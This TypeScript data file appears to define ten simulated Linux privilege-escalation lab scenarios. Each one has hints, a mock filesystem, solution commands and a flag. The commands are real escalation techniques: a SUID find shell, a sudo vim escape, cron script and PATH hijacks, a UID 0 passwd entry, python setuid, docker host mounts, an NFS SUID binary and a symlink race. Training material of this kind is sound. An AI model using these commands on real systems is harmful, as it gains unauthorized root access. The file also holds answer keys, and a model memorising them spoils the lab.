import type { PrivescScenario } from './types';

export const PRIVESC_SCENARIOS: PrivescScenario[] = [
  {
    id: 'privesc-001',
    title: 'SUID Find',
    description:
      'You have a low-privilege shell on a Linux server. A routine audit reveals that common utilities may have been misconfigured. Explore the filesystem to find a way to escalate to root and capture the flag stored in /root/flag.txt.',
    technique: 'SUID Binary',
    difficulty: 'beginner',
    hints: [
      'Run: find / -perm -4000 -type f 2>/dev/null',
      'The find binary has the SUID bit set — it can execute commands as the file owner.',
      'GNU find supports the -exec flag. Combine it with /bin/bash to spawn a root shell.',
    ],
    filesystem: {
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\napt:x:100:65534::/nonexistent:/usr/sbin/nologin\ntrainee:x:1000:1000:trainee:/home/trainee:/bin/bash',
      '/etc/shadow': 'root:$6$rounds=656000$redacted::0:99999:7:::',
      '/home/trainee/.bash_history': 'ls -la\nwhoami\nfind / -perm -4000 -type f 2>/dev/null',
      '/home/trainee/notes.txt':
        '# System Notes\n- The sysadmin installed find with SUID for recursive audits\n- /root/flag.txt contains today\'s flag\n- Do NOT share root credentials',
      '/usr/bin/find': '[SUID binary — owned by root, mode 4755]',
      '/root/flag.txt': 'FLAG{su1d_b1nary_3scalation_f0und}',
    },
    solutionCommands: [
      'find / -perm -4000 -type f 2>/dev/null',
      'find /tmp -exec /bin/bash -p \\;',
      'cat /root/flag.txt',
    ],
    flag: 'FLAG{su1d_b1nary_3scalation_f0und}',
  },
  {
    id: 'privesc-002',
    title: 'Sudo Vim Escape',
    description:
      'You are logged in as the user "analyst". Running sudo -l reveals that your user can run vim as root without a password. Exploit this misconfiguration to read the root flag.',
    technique: 'Sudo Misconfiguration',
    difficulty: 'beginner',
    hints: [
      'Check your sudo permissions with: sudo -l',
      'Vim can execute shell commands when run with elevated privileges.',
      'From vim, run :!cat /root/flag.txt or :!bash to spawn a root shell.',
    ],
    filesystem: {
      '/etc/sudoers':
        'root\tALL=(ALL:ALL) ALL\nanalyst\tALL=(root) NOPASSWD: /usr/bin/vim\n',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\nanalyst:x:1001:1001::/home/analyst:/bin/bash',
      '/home/analyst/.bash_history': 'sudo vim /etc/nginx/nginx.conf',
      '/home/analyst/README.txt':
        '# Analyst Workstation\n- You have sudo access to vim for editing configs\n- Flag is in /root/flag.txt\n- Contact admin if you need additional access',
      '/root/flag.txt': 'FLAG{sudo_vim_3sc4pe_to_ro0t}',
    },
    solutionCommands: [
      'sudo -l',
      'sudo vim -c ":!cat /root/flag.txt"',
    ],
    flag: 'FLAG{sudo_vim_3sc4pe_to_ro0t}',
  },
  {
    id: 'privesc-003',
    title: 'Cron Job Hijack',
    description:
      'A legacy server runs a cleanup script every minute via cron. The script is world-writable. Exploit this to escalate privileges and read the root flag.',
    technique: 'Cron Job Abuse',
    difficulty: 'intermediate',
    hints: [
      'Examine /etc/crontab and /etc/cron.d/ for scheduled tasks.',
      'The cleanup script at /opt/cleanup.sh is owned by root but writable by everyone.',
      'Overwrite the script with a reverse shell or a command that reads the flag, then wait for cron to execute it.',
    ],
    filesystem: {
      '/etc/crontab':
        'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user\tcommand\n* * * * * root\t/opt/cleanup.sh',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndev:x:1002:1002::/home/dev:/bin/bash',
      '/opt/cleanup.sh':
        '#!/bin/bash\n# Scheduled cleanup — runs every minute\n# Last modified by deploy bot 2025-11-03\nLOGDIR=/var/log/tmp\nmkdir -p $LOGDIR\nfind /tmp -type f -mtime +1 -delete\nfind /var/tmp -type f -mtime +1 -delete\necho "[$(date)] Cleanup complete" >> /var/log/cleanup.log',
      '/home/dev/notes.txt':
        '# Dev Notes\n- The cleanup script runs as root every minute\n- You can write to /opt/cleanup.sh\n- /root/flag.txt is the target\n- Make sure your payload writes to a location you can read',
      '/root/flag.txt': 'FLAG{cr0n_j0b_writable_sc1pt_pr1vesc}',
    },
    solutionCommands: [
      'cat /etc/crontab',
      'ls -la /opt/cleanup.sh',
      'echo \'#!/bin/bash\ncat /root/flag.txt > /home/dev/flag_output.txt\' > /opt/cleanup.sh',
      'chmod +x /opt/cleanup.sh',
      'sleep 65',
      'cat /home/dev/flag_output.txt',
    ],
    flag: 'FLAG{cr0n_j0b_writable_sc1pt_pr1vesc}',
  },
  {
    id: 'privesc-004',
    title: 'Writable passwd',
    description:
      'You discover that /etc/passwd is world-writable — a critical misconfiguration. Craft a password entry for a new user with root-level UID and escalate to root.',
    technique: 'Writable /etc/passwd',
    difficulty: 'intermediate',
    hints: [
      'Check file permissions: ls -la /etc/passwd',
      'You can add a new entry to /etc/passwd with UID 0 — it will be treated as root.',
      'Generate a password hash with: openssl passwd -1 -salt abc newpass',
    ],
    filesystem: {
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\noperator:x:37:37::/root:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash',
      '/etc/passwd.perm': '-rw-r--r-- 1 root root 1847 Nov  3 10:00 /etc/passwd',
      '/etc/shadow': 'root:$6$rounds=656000$redacted::0:99999:7:::',
      '/home/ubuntu/.bash_history': 'ls -la /etc/passwd\nfind / -writable -type f 2>/dev/null',
      '/home/ubuntu/hint.txt':
        '# Recon Complete\n- /etc/passwd is world-writable!\n- You can add a user with UID 0 to gain root\n- Generate a password hash: openssl passwd -1 -salt xyz newpass\n- Then add the line to /etc/passwd\n- The flag is in /root/flag.txt',
      '/root/flag.txt': 'FLAG{wr1t4ble_3tc_p4sswd_3scalation}',
    },
    solutionCommands: [
      'ls -la /etc/passwd',
      'openssl passwd -1 -salt xyz newpass',
      'echo "pwned:$1$xyz$<hash>:0:0::/root:/bin/bash" >> /etc/passwd',
      'su pwned',
      'cat /root/flag.txt',
    ],
    flag: 'FLAG{wr1t4ble_3tc_p4sswd_3scalation}',
  },
  {
    id: 'privesc-005',
    title: 'Dirty Kernel',
    description:
      'The server runs an unpatched Linux kernel with a known privilege escalation CVE. Research the kernel version and compile an exploit to gain root access.',
    technique: 'Kernel Exploit',
    difficulty: 'advanced',
    hints: [
      'Run uname -a to identify the kernel version.',
      'Linux kernel 3.13.0 is vulnerable to CVE-2015-1328 (overlayfs local privilege escalation).',
      'Search for a public exploit, compile it with gcc, and execute it to spawn a root shell.',
    ],
    filesystem: {
      '/proc/version':
        'Linux server01 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 GNU/Linux',
      '/etc/os-release':
        'NAME="Ubuntu"\nVERSION="14.04.6 LTS, Trusty Tahr"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME="Ubuntu 14.04.6 LTS"',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\noperator:x:37:37::/root:/usr/sbin/nologin\ndev:x:1000:1000::/home/dev:/bin/bash',
      '/home/dev/.bash_history': 'uname -a\ncat /etc/os-release',
      '/home/dev/readme.txt':
        '# Security Audit Notes\n- Kernel is 3.13.0-24-generic — UNPATCHED\n- This version is vulnerable to CVE-2015-1328 (overlayfs)\n- gcc is installed at /usr/bin/gcc\n- Public exploits available on exploit-db\n- /root/flag.txt is the target',
      '/usr/bin/gcc': '[available — gcc 4.8.4]',
      '/root/flag.txt': 'FLAG{k3rn3l_3xplo1t_cve_2015_1328}',
    },
    solutionCommands: [
      'uname -a',
      'cat /etc/os-release',
      'gcc exploit.c -o exploit',
      './exploit',
      'cat /root/flag.txt',
    ],
    flag: 'FLAG{k3rn3l_3xplo1t_cve_2015_1328}',
  },
  {
    id: 'privesc-006',
    title: 'Cap Setuid Python',
    description:
      'The sysadmin granted python3 the cap_setuid capability for a deployment script. Exploit this capability to elevate to root.',
    technique: 'Capabilities',
    difficulty: 'intermediate',
    hints: [
      'Check capabilities with: getcap -r / 2>/dev/null',
      'Python3 has cap_setuid=ep — this allows it to change its effective UID.',
      'Use Python to set uid to 0 and spawn a shell.',
    ],
    filesystem: {
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndeploy:x:1003:1003::/home/deploy:/bin/bash',
      '/etc/security/capability.conf':
        'cap_setuid=ep /usr/bin/python3.4\n',
      '/usr/bin/python3.4': '[binary with cap_setuid=ep]',
      '/home/deploy/.bash_history': 'getcap -r / 2>/dev/null',
      '/home/deploy/deploy-note.txt':
        '# Deployment Notes\n- python3 has cap_setuid for the deploy user\n- Getcap output: /usr/bin/python3.4 cap_setuid=ep\n- The flag is in /root/flag.txt\n- Hint: Python\'s os module can call setuid(0)',
      '/root/flag.txt': 'FLAG{c4p4b1l1ty_c4p_setuid_pyth0n}',
    },
    solutionCommands: [
      'getcap -r / 2>/dev/null',
      'python3.4 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
      'cat /root/flag.txt',
    ],
    flag: 'FLAG{c4p4b1l1ty_c4p_setuid_pyth0n}',
  },
  {
    id: 'privesc-007',
    title: 'PATH Trick',
    description:
      'A system script uses a relative path to call a utility. By placing a malicious binary earlier in your PATH, you can hijack the execution and escalate privileges.',
    technique: 'PATH Hijacking',
    difficulty: 'beginner',
    hints: [
      'Examine scripts that run as root — look for relative paths like "backup" instead of "/usr/bin/backup".',
      'Create a malicious script named "backup" in a directory you control.',
      'Add your directory to the front of PATH before the script runs.',
    ],
    filesystem: {
      '/etc/crontab':
        'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n0 2 * * * root\t/usr/local/bin/db_backup.sh',
      '/usr/local/bin/db_backup.sh':
        '#!/bin/bash\n# Nightly database backup — do not modify\nbackup --compress --dest /var/backups/db/\necho "Backup completed at $(date)" >> /var/log/backup.log',
      '/usr/bin/backup': '[legitimate backup utility owned by root]',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndev:x:1004:1004::/home/dev:/bin/bash',
      '/home/dev/notes.txt':
        '# PATH Hijack Lab\n- /usr/local/bin/db_backup.sh runs as root via cron\n- It calls "backup" without a full path\n- Create /home/dev/bin/backup with your payload\n- Set PATH=/home/dev/bin:$PATH\n- The flag is in /root/flag.txt',
      '/root/flag.txt': 'FLAG{p4th_h1j4ck_pr1vesc_cr0n}',
    },
    solutionCommands: [
      'cat /usr/local/bin/db_backup.sh',
      'mkdir -p /home/dev/bin',
      'echo \'#!/bin/bash\ncat /root/flag.txt > /home/dev/root_flag.txt\' > /home/dev/bin/backup',
      'chmod +x /home/dev/bin/backup',
      'export PATH=/home/dev/bin:$PATH',
      'crontab -l',
      '/usr/local/bin/db_backup.sh',
      'cat /home/dev/root_flag.txt',
    ],
    flag: 'FLAG{p4th_h1j4ck_pr1vesc_cr0n}',
  },
  {
    id: 'privesc-008',
    title: 'Docker Breakout',
    description:
      'Your user is a member of the docker group. Use this membership to mount the host filesystem and read the root flag — no actual container escape needed.',
    technique: 'Docker Group',
    difficulty: 'intermediate',
    hints: [
      'Check your groups: id',
      'Members of the docker group can run docker commands, which map to the Docker daemon (root).',
      'Use: docker run -v /:/mnt --rm -it alpine chroot /mnt cat /root/flag.txt',
    ],
    filesystem: {
      '/etc/group': 'docker:x:999:trainee',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ntrainee:x:1005:1005::/home/trainee:/bin/bash',
      '/home/trainee/.bash_history': 'id\ndocker images',
      '/home/trainee/docker-lab-notes.txt':
        '# Docker Group Lab\n- Your user (trainee) is in the docker group\n- Docker is installed and the daemon is running\n- You can mount the host filesystem into a container\n- Target: /root/flag.txt on the host\n- Hint: docker run -v /:/mnt --rm -it alpine chroot /mnt <command>',
      '/var/run/docker.sock': '[Docker socket — accessible by docker group]',
      '/root/flag.txt': 'FLAG{d0ck3r_gr0up_m0unt_h0st_f1lesystem}',
    },
    solutionCommands: [
      'id',
      'docker run -v /:/mnt --rm -it alpine chroot /mnt cat /root/flag.txt',
    ],
    flag: 'FLAG{d0ck3r_gr0up_m0unt_h0st_f1lesystem}',
  },
  {
    id: 'privesc-009',
    title: 'NFS No Root Squash',
    description:
      'An NFS share is exported with no_root_squash, allowing any client to write files as root. Create an SUID binary on the share, mount it, and execute it to gain root.',
    technique: 'NFS no_root_squash',
    difficulty: 'advanced',
    hints: [
      'Check /etc/exports for NFS share configurations.',
      'The share /srv/nfs/data is exported with no_root_squash — the root user on any client is mapped to root on the server.',
      'Create a SUID root binary on the share from the client, then execute it on the server.',
    ],
    filesystem: {
      '/etc/exports':
        '# /etc/exports: NFS share configuration\n/srv/nfs/data\t192.168.1.0/24(rw,sync,no_subtree_check,no_root_squash)\n/srv/nfs/public\t192.168.1.0/24(ro,sync,subtree_check,root_squash)',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\nnfsuser:x:1006:1006::/home/nfsuser:/bin/bash',
      '/home/nfsuser/nfs-notes.txt':
        '# NFS Lab Notes\n- /etc/exports shows /srv/nfs/data with no_root_squash\n- You have a client at 192.168.1.50 that can write to the share\n- Create a C program that calls setuid(0) then exec(/bin/bash)\n- Compile it on the client, set the SUID bit, then execute it on the server\n- /root/flag.txt is the target',
      '/home/nfsuser/exploit_template.c':
        '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void) {\n    setuid(0);\n    setgid(0);\n    system("/bin/bash -p");\n    return 0;\n}',
      '/srv/nfs/data': '[NFS share — mounted from client with no_root_squash]',
      '/root/flag.txt': 'FLAG{nfs_n0_r00t_sqush_3scalation}',
    },
    solutionCommands: [
      'cat /etc/exports',
      'mount | grep nfs',
      'gcc exploit_template.c -o /srv/nfs/data/rootsh',
      'chmod +s /srv/nfs/data/rootsh',
      './rootsh',
      'cat /root/flag.txt',
    ],
    flag: 'FLAG{nfs_n0_r00t_sqush_3scalation}',
  },
  {
    id: 'privesc-010',
    title: 'Sticky Bit Race',
    description:
      'A world-writable directory with the sticky bit missing contains a predictable temporary file created by a root-owned cron job. Race against the cron to replace the file with a symlink to /root/flag.txt.',
    technique: 'Sticky Bit Race Condition',
    difficulty: 'advanced',
    hints: [
      'Check /tmp/shared for files with ls -la — the sticky bit is NOT set.',
      'A cron job copies the contents of /tmp/shared/scratch.txt to a root-owned location and processes it.',
      'Replace scratch.txt with a symlink to /root/flag.txt before the cron job runs. The cron job will read the flag contents.',
    ],
    filesystem: {
      '/etc/crontab':
        'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n* * * * * root\tcat /tmp/shared/scratch.txt >> /var/log/scratch.log',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\nuser:x:1007:1007::/home/user:/bin/bash',
      '/tmp/shared/scratch.txt': 'default temp data — overwritten by cron',
      '/tmp/shared/': '[world-writable directory — drwxrwxrwx — NO sticky bit]',
      '/var/log/scratch.log': '[cron appends contents of scratch.txt here]',
      '/home/user/race-notes.txt':
        '# Sticky Bit Race Lab\n- /tmp/shared has NO sticky bit — any user can delete any file\n- A cron job reads /tmp/shared/scratch.txt every minute\n- Replace scratch.txt with a symlink to /root/flag.txt\n- Then check /var/log/scratch.log for the flag contents\n- Race condition: delete and recreate before cron reads it',
      '/root/flag.txt': 'FLAG{st1cky_b1t_r4ce_c0nd1t10n}',
    },
    solutionCommands: [
      'ls -la /tmp/shared/',
      'cat /etc/crontab',
      'rm -f /tmp/shared/scratch.txt && ln -s /root/flag.txt /tmp/shared/scratch.txt',
      'sleep 65',
      'cat /var/log/scratch.log',
    ],
    flag: 'FLAG{st1cky_b1t_r4ce_c0nd1t10n}',
  },
];
